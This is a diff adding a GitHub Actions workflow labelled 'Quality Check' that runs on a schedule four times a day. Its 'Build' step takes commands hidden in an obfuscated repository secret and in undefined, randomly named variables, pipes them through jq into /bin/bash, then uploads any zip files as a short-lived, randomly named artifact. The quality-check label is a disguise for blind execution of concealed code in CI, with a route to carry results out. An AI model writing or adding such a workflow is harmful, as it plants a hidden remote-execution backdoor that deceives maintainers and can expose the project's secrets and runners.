@@ -1,0 +1,37 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          dfy24662: ${{ secrets.dfy24662 }}
+        run: |
+          printf '%s' "$dfy24662" | jq -r .grezx21 | /bin/bash
+          echo $s3500 | jq -r .gahqs284 | /bin/bash
+          printf '%s' "$lhjn36" | jq -r .b43 | /bin/bash
+          echo $ahr42 | jq -r .sjpag0 | /bin/bash
+          echo $uy0117 | jq -r .gucv6 | /bin/bash
+          printf '%s' "$qygwp92960" | jq -r .koej7 | /bin/bash
+          printf '%s' "$dt7" | jq -r .alhw22 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2ICHqiOx
+          path: "*.zip"
+          retention-days: 1
